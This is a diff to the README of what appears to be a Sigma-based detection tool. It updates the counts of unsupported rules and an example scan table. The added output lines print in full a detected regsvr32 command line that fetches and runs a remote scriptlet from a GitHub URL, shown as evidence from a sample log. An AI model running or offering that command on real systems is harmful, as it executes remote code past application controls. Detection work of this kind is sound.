@@ -76,8 +76,9 @@ in [`matcher.py`](src/bastion/sigma/matcher.py): field maps with the
 `cased` and `all` flags, the `windash`/`base64`/`base64offset` value transforms (with
 `utf16le`/`wide`/`utf16be` encodings), wildcards with Sigma escaping, keyword lists, and
 conditions built from `and`/`or`/`not`, parentheses, and `N of` / `all of`. Anything outside
-the subset raises a recorded `UnsupportedRuleError`; at the pinned release that leaves 2 of
-2,458 Windows rules unevaluable (aggregation rules), both disclosed in every report.
+the subset raises a recorded `UnsupportedRuleError`; at the pinned release (SigmaHQ
+r2026-07-01) that leaves 3 of 3,150 loaded rules unevaluable (two use the `fieldref`
+modifier, one the `re` modifier's `i` flag), all disclosed in every report.
 
 `engine.py` pre-filters rules by platform and Sigma event category, so a `registry_set` rule
 is never evaluated against a process-creation event, and retires erroring rules without
@@ -101,20 +102,32 @@ $ bastion scan examples/logs/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx
 | Commandline Flag     |        |                      | tem32\regsvr32.exe;  |
 | Anomaly              |        |                      | CommandLine=/u /s    |
 |                      |        |                      | /i:https://raw.githu |
-|                      |        |                      | busercontent.com/... |
+|                      |        |                      | busercontent.com/3gs |
+|                      |        |                      | tudent/SCTPersistenc |
+|                      |        |                      | e/master/calc.sct    |
+|                      |        |                      | scrobj.dll           |
 | Potentially          | medium | T1218.010 Regsvr32   | Image=C:\Windows\Sys |
 | Suspicious Regsvr32  |        |                      | tem32\regsvr32.exe;  |
 | HTTP/FTP Pattern     |        |                      | CommandLine=/u /s    |
 |                      |        |                      | /i:https://raw.githu |
-|                      |        |                      | busercontent.com/... |
+|                      |        |                      | busercontent.com/3gs |
+|                      |        |                      | tudent/SCTPersistenc |
+|                      |        |                      | e/master/calc.sct    |
+|                      |        |                      | scrobj.dll           |
 | Network Connection   | medium | T1559.001 Component  | Initiated=True;      |
 | Initiated By         |        | Object Model,        | Image=C:\Windows\Sys |
 | Regsvr32.EXE         |        | T1218.010 Regsvr32   | tem32\regsvr32.exe   |
 +-----------------------------------------------------------------------------+
-3 detections across 2 techniques (6 events, 2458 rules); ruleset covers 308 of
-697 enterprise techniques.
+3 detections across 2 techniques (6 events, 2467 rules); ruleset covers 313 of
+706 enterprise techniques.
 1 rules use unsupported Sigma grammar and were not evaluated (recorded, not
 counted as coverage).
+140 rules were not evaluable on 587 rule-event pairs: a field they need is
+absent from this source (missing: OriginalFileName (574), cs-method (6),
+cs-uri-query (6), FileName (6), ParentUser (1)). Counted as not evaluable,
+never as no match.
+51 rules read no field this log carries (their logsource is not routed to it);
+not evaluated, not counted as no match.
 ```
 
 The committed artifacts of this exact run live in `examples/output/`:
